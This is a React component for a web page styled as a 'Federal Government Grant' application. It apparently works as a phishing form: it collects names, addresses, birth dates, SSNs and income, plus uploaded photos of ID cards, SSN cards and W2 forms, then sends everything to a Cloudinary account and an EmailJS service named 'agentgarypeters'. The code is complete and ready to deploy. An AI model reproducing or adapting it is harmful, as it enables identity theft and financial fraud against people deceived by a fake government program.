import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const Form = () => {
  const formRef = useRef(null);
  const navigate = useNavigate();
  const [images, setImages] = useState({
    idFront: null,
    idBack: null,
    ssnImage: null,
    w2Form: null,
  });

  const [previews, setPreviews] = useState({
    idFront: null,
    idBack: null,
    ssnImage: null,
    w2Form: null,
  });

  const [isLoading, setIsLoading] = useState(false);

  const uploadToCloudinary = async (file) => {
    if (!file) return null;
    const formData = new FormData();
    formData.append("file", file);
    formData.append("upload_preset", "my_unsigned_preset");

    try {
      const response = await axios.post(
        "https://api.cloudinary.com/v1_1/dkmpjnwji/image/upload",
        formData
      );
      return response.data.secure_url;
    } catch (error) {
      console.error("Cloudinary Upload Error:", error.response?.data || error);
      return null;
    }
  };

  const handleFileChange = (e, field) => {
    const file = e.target.files[0];
    if (file) {
      setImages((prev) => ({ ...prev, [field]: file }));
      setPreviews((prev) => ({ ...prev, [field]: URL.createObjectURL(file) }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    const uploadedImages = {};
    for (const key in images) {
      uploadedImages[key] = await uploadToCloudinary(images[key]);
    }

    const formData = {
      fullName: formRef.current.fullName.value,
      address: formRef.current.address.value,
      gender: formRef.current.gender.value,
      dob: formRef.current.dob.value,
      maritalStatus: formRef.current.maritalStatus.value,
      phone: formRef.current.phone.value,
      email: formRef.current.email.value,
      houseStatus: formRef.current.houseStatus.value,
      paymentMethod: formRef.current.paymentMethod.value,
      occupation: formRef.current.occupation.value,
      monthlyIncome: formRef.current.monthlyIncome.value,
      purpose: formRef.current.purpose.value,
      nationality: formRef.current.nationality.value,
      referral: formRef.current.referral.value,
      ssn: formRef.current.ssn.value,
      ssnImage: uploadedImages.ssnImage,
      idFront: uploadedImages.idFront,
      idBack: uploadedImages.idBack,
      w2Form: uploadedImages.w2Form,
    };

    emailjs
      .send("agentgarypeters", "template_o8rzqqt", formData, "2NC_Ps_Z6ErcbIsuF")
      .then(() => {
        alert("Application submitted successfully!");
        formRef.current.reset();
        setImages({ idFront: null, idBack: null, ssnImage: null, w2Form: null });
        setPreviews({ idFront: null, idBack: null, ssnImage: null, w2Form: null });
        navigate("/");
      })
      .catch((err) => console.error("EmailJS Error:", err))
      .finally(() => setIsLoading(false));
  };

  return (
    <div className="max-w-4xl mx-auto p-8 bg-white shadow-lg rounded-lg">
      <h1 className="text-5xl md:text-6xl font-extrabold text-center text-blue-600 mb-2">
        Federal Government Grant
      </h1>
      <h2 className="text-2xl md:text-3xl font-bold text-center text-blue-600 mb-6">
        Application Form
      </h2>

      <form ref={formRef} onSubmit={handleSubmit} className="space-y-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {[
            ["fullName", "Full Name"],
            ["address", "Address"],
            ["gender", "Gender"],
            ["dob", "Date of Birth", "date"],
            ["maritalStatus", "Marital Status"],
            ["phone", "Phone Number", "tel"],
            ["email", "Email", "email"],
            ["houseStatus", "House Status"],
            ["paymentMethod", "Payment Method"],
            ["occupation", "Occupation"],
            ["monthlyIncome", "Monthly Income"],
            ["nationality", "Nationality"],
            ["referral", "Name of Referral"],
            ["ssn", "SSN"],
          ].map(([name, label, type = "text"]) => (
            <div key={name} className="flex items-center">
              <label className="w-1/3 font-semibold text-gray-700">{label}:</label>
              <input
                type={type}
                name={name}
                required
                className="w-2/3 p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
              />
            </div>
          ))}
        </div>

        <div>
          <label className="font-semibold text-gray-700">Purpose</label>
          <textarea
            name="purpose"
            required
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
            rows="4"
          ></textarea>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 p-4">
          {[
            ["idFront", "Upload ID Front"],
            ["idBack", "Upload ID Back"],
            ["ssnImage", "Upload SSN Card"],
            ["w2Form", "Upload W2 Form"],
          ].map(([key, label]) => (
            <div key={key} className="flex flex-col items-center bg-white p-4 rounded-xl shadow-lg border border-gray-200">
              <label className="font-semibold text-gray-700 mb-2">{label}</label>
              <input
                type="file"
                accept="image/*"
                onChange={(e) => handleFileChange(e, key)}
                className="w-full cursor-pointer p-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
              />
              {previews[key] && (
                <img
                  src={previews[key]}
                  alt="Preview"
                  className="mt-3 w-32 h-32 object-cover border rounded-lg shadow-md hover:scale-105 transition-transform duration-200"
                />
              )}
            </div>
          ))}
        </div>

        <button
          type="submit"
          className="bg-blue-600 text-white px-4 py-3 rounded-md w-full text-lg font-semibold hover:bg-blue-700"
          disabled={isLoading}
        >
          {isLoading ? "Submitting..." : "Submit"}
        </button>
      </form>
    </div>
  );
};

export default Form;
